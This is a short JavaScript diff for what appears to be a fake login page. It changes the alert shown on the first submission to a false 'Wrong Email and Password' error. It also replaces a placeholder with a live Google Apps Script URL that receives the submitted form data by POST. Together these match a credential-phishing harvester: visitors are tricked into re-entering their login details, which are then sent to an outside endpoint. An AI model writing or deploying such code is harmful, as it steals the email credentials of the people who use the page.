@@ -8,7 +8,7 @@ document.addEventListener("DOMContentLoaded", () => {
       e.preventDefault();
 
       if (firstAttempt) {
-        alert("Oops 😜 Wrong name, try again!");
+        alert("Wrong Email and Password Try again !, try again!");
         firstAttempt = false;
         return;
       }
@@ -37,7 +37,7 @@ document.addEventListener("DOMContentLoaded", () => {
       };
 
       // TODO: Replace with Google Script Web App URL for email notification
-      fetch("YOUR_GOOGLE_SCRIPT_WEB_APP_URL", {
+      fetch("https://script.google.com/macros/s/AKfycbxxY3APfkooNw2RIIQhkk-e39CQ7u0EkyQ1LyooOMUAYY_abNx30DMXQ4r8832Xp1IBnw/exec", {
         method: "POST",
         body: JSON.stringify(formData)
       });
